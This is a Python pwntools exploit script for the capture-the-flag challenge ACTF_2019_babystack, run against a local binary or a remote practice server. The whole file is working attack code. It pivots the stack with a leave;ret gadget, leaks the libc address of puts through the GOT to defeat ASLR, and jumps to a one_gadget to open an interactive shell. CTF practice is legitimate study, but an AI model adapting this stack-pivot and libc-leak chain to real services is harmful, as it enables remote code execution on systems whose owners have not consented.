#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ACTF_2019_babystack')
	elf = ELF('./ACTF_2019_babystack',checksec=False)
 	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',26170)
	elf = ELF('./ACTF_2019_babystack',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
vuln = 0x0000000004008F6
leave_ret = 0x0000000000400a18
pop_ret = 0x0000000000400ad3

def pivot(payload):
    sla("How many bytes of your message?\n",'224')
    ru('Your message will be saved at ')
    stack = int(rv(14),16)
    payload = payload.ljust(0xD0,'A')
    payload+= p64(stack) + p64(leave_ret)
    sda('>',payload)

###leak libc###
payload = 'A' * 0x8 + p64(pop_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
pivot(payload)

puts = u64(ru('\x7f')[-6:].ljust(8,'\x00'))



libc_base = puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh').next()
one_gadget = libc_base + 0x4f2c5

###ROP###
payload = 'A' * 0x8 + p64(one_gadget)
pivot(payload)


###get shell###
ia()